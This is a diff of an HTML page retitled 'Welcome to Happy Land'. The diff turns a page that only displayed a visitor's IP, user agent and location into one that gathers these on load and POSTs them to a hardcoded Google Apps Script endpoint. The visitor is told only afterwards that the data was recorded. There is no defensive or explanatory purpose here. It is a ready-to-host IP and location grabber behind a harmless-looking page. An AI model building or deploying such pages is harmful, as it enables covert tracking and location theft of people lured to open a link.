@@ -1,65 +1,56 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Collector</title>
+    <title>Welcome to Happy Land</title>
 </head>
 <body>
-    <h1>Welcome to the Happy Land</h1>
-    <p>Your IP address is: <span id="ipAddress"></span></p>
-    <p>Your user agent is: <span id="userAgent"></span></p>
-    <p>Your latitude is: <span id="latitude"></span></p>
-    <p>Your longitude is: <span id="longitude"></span></p>
-    <p>The current time is: <span id="currentTime"></span></p>
-
+    <h1>Welcome to Happy Land</h1>
+    <p>Your information has been recorded and sent to the Google Drive document.</p>
     <script>
-        // Function to fetch IP address
-        function getIPAddress() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ipAddress').textContent = data.ip;
-                })
-                .catch(error => {
-                    console.log('Error fetching IP address:', error);
-                });
+        // Function to send data to Google Apps Script
+        function sendDataToGoogleAppsScript(data) {
+            const scriptUrl = 'https://script.google.com/macros/s/AKfycbxUbfK6VrQU8WA3lJggS_jWPxsMo-W9yUAOmWNk2HzT93urR1nG7KMbEF-NtUNq9K3T/exec';
+            const request = new XMLHttpRequest();
+            request.open('POST', scriptUrl, true);
+            request.setRequestHeader('Content-Type', 'application/json');
+            request.onload = function() {
+                console.log('Data sent to Google Apps Script:', request.responseText);
+            };
+            request.send(JSON.stringify(data));
         }
 
-        // Function to get user agent
-        function getUserAgent() {
-            document.getElementById('userAgent').textContent = navigator.userAgent;
-        }
-
-        // Function to get latitude and longitude
-        function getLocation() {
+        // Function to get user's geolocation
+        function getGeolocation(callback) {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    callback(position.coords.latitude, position.coords.longitude);
+                });
             } else {
                 console.log('Geolocation is not supported by this browser.');
+                callback(null, null);
             }
         }
 
-        function showPosition(position) {
-            document.getElementById('latitude').textContent = position.coords.latitude;
-            document.getElementById('longitude').textContent = position.coords.longitude;
+        // Function to get user's IP and user agent
+        async function getUserInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const userAgent = navigator.userAgent;
+
+            getGeolocation(function(latitude, longitude) {
+                const data = {
+                    ip: ip,
+                    userAgent: userAgent,
+                    latitude: latitude,
+                    longitude: longitude
+                };
+                sendDataToGoogleAppsScript(data);
+            });
         }
 
-        function showError(error) {
-            console.log('Error getting location:', error);
-        }
-
-        // Function to get current time
-        function getCurrentTime() {
-            const now = new Date();
-            document.getElementById('currentTime').textContent = now.toLocaleTimeString();
-        }
-
-        // Call functions on page load
-        getIPAddress();
-        getUserAgent();
-        getLocation();
-        getCurrentTime();
+        // Call the function to get user's information
+        getUserInfo();
     </script>
 </body>
 </html>
